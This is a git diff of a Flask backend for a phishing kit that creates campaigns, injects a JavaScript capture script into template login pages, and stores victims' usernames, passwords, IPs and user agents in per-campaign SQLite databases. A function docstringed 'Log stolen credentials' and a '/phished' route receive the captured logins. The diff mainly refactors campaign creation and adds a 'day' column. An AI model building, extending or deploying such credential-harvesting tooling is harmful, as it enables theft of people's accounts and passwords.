@@ -31,38 +31,6 @@ def generate_token(username, user_id):
     }
     return jwt.encode(payload, SECRET_KEY, algorithm="HS256")
 
-# def create_new_campaign_db(user_id, campaign_name):
-#     user_folder = f"{USERS_DIR}/{user_id}/{DBS_DIR}"
-    
-#     if not os.path.exists(user_folder):
-#         os.makedirs(user_folder)
-
-#     campaign_db_path = os.path.join(user_folder, f"{campaign_name}.db")
-
-#     if os.path.exists(campaign_db_path):
-#         return None 
-
-#     conn = sqlite3.connect(campaign_db_path)
-#     cursor = conn.cursor()
-
-#     cursor.execute('''
-#     CREATE TABLE credentials (
-#         id INTEGER PRIMARY KEY AUTOINCREMENT,
-#         page TEXT NOT NULL,
-#         username TEXT NOT NULL,
-#         password TEXT NOT NULL,
-#         ip TEXT NOT NULL,
-#         user_agent TEXT NOT NULL,
-#         date DATE
-#         time TIME
-#     );
-#     ''')
-
-#     conn.commit()
-#     conn.close()
-
-#     return campaign_db_path
-
 def create_new_campaign_db(user_id, campaign_name):
     is_db_exist = False
     is_request_error    = False
@@ -91,7 +59,8 @@ def create_new_campaign_db(user_id, campaign_name):
             ip TEXT NOT NULL,
             user_agent TEXT NOT NULL,
             date DATE, 
-            time TIME
+            time TIME,
+            day TEXT
         );
         ''')
 
@@ -106,7 +75,6 @@ def create_new_campaign_db(user_id, campaign_name):
         is_request_error = True
         return is_db_exist, is_request_error, campaign_db_path
     
-
 def create_campaigns_db(user_id, campaign_name, page_name, targets_number=0, template=False):
     user_folder = f"{USERS_DIR}/{user_id}"
     campaigns_db_dir = os.path.join(user_folder, CAMPAIGNS_DIR)
@@ -134,7 +102,7 @@ def create_campaigns_db(user_id, campaign_name, page_name, targets_number=0, tem
             )
         """)
 
-        date_created, time_created = get_current_date()
+        date_created, time_created, _ = get_current_date()
 
         # Insert new campaign if it doesn't exist
         cursor.execute("""
@@ -158,28 +126,18 @@ def create_campaigns_db(user_id, campaign_name, page_name, targets_number=0, tem
             conn.close()
             print("Database connection closed.")
 
-def create_campaign_js_file(user_id, campaign_name, txt):
-    user_folder = f"{USERS_DIR}/{user_id}/js"
+def create_script(user_id, campaign_name, page_name, template):
+    campaign_js_script = create_js_script(user_id, campaign_name) 
     
-    if not os.path.exists(user_folder):
-        os.makedirs(user_folder)
-
-    try:
-        if not os.path.exists(user_folder):
-            os.makedirs(user_folder)
-            print(f"Folder '{user_folder}' created successfully.")
+    if template:
+        html_page = add_script_to_html(
+            html_path=os.path.join(TEMPLATES_DIR, f"{page_name}.html"),
+            script=campaign_js_script
+        )
+        return html_page
+    else:
+        return campaign_js_script
     
-        file_path = os.path.join(user_folder, f"{campaign_name}.js")
-        
-        with open(file_path, 'w') as file:
-            file.write(txt)
-        print(f"File '{file_path}' created and written successfully.")
-        return file_path
-
-    except Exception as e:
-        print(f"An error occurred: {e}")
-        return None
-
 def fetch_data(db_path, table_name):
     """Fetch content from a specific campaign database and return as a list of dictionaries."""
     conn = sqlite3.connect(db_path)
@@ -261,14 +219,14 @@ def remove_campaign(user_id, campaign_name):
 def log_credentials(db, page, username, password, ip):
     """Log stolen credentials into SQLite database"""
     user_agent = request.headers.get('User-Agent')
-    date, time = get_current_date()
+    date, time, day = get_current_date()
 
     conn = sqlite3.connect(db)
     cursor = conn.cursor()
     cursor.execute("""
-        INSERT INTO credentials (page, username, password, ip, user_agent, date, time)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
-    """, (page, username, password, ip, user_agent, date, time))
+        INSERT INTO credentials (page, username, password, ip, user_agent, date, time, day)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    """, (page, username, password, ip, user_agent, date, time, day))
     
     conn.commit()
     conn.close()
@@ -322,6 +280,7 @@ def get_campaign():
     
     return jsonify(campaigns_with_data), 200
 
+
 # Return the all page if the user wanted our template,
 # if he has his own page, return only the js script <script>...</script>
 @app.route('/campaigns/fetch_campaign/script', methods=['POST'])
@@ -352,6 +311,7 @@ def get_campaign_script():
             "message": "Campaign created successfully", 
             "js": script_to_send
         }), 200
+
 
 # Create new Campaign       
 @app.route('/campaigns/create', methods=['POST'])
@@ -389,12 +349,14 @@ def create_campaign():
     if is_request_error:
         return jsonify({"message": "Error in creating campaign"}), 409
     
-    campaign_js_script = create_js_script(user_id, campaign_name) 
- 
+
+    script_to_send = create_script(user_id, campaign_name, page_name, template)
+
     return jsonify({
             "message": "Campaign created successfully", 
-            "js": campaign_js_script
+            "js": script_to_send
         }), 200
+
 
 # Call it when a target open the page, before submitting
 @app.route('/campaign/<user_id>/<campaign_name>/phished', methods=['GET', 'POST'])
@@ -437,6 +399,7 @@ def get_credentails(user_id, campaign_name):
         
     return "True", 200
 
+
 @app.route('/login', methods=['POST'])
 def login():
 
@@ -457,6 +420,7 @@ def login():
         return jsonify({"token": token}), 200
     else:
         return jsonify({"error": "Invalid credentials"}), 401
+
 
 @app.route('/templates', methods=['GET'])
 def list_templates():
